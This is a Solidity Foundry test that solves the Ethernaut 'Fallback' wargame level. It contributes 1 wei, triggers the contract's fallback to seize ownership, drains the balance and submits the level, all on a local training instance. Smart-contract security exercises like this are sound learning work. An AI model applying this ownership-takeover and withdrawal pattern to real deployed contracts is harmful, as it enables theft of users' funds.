// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testFallbackHack() public {
        // Level setup
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //
        // Level attack
        //
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.getContribution(), 1 wei);

        (bool success,) = address(ethernautFallback).call{value: 1 wei}("");
        assertTrue(success);
        assertEq(ethernautFallback.owner(), eoaAddress);

        emit log_named_uint("Fallback contract balance pre withdraw", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        uint256 newBalance = address(ethernautFallback).balance;
        emit log_named_uint("Fallback contract balance post withdraw", newBalance);
        assertEq(newBalance, 0);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
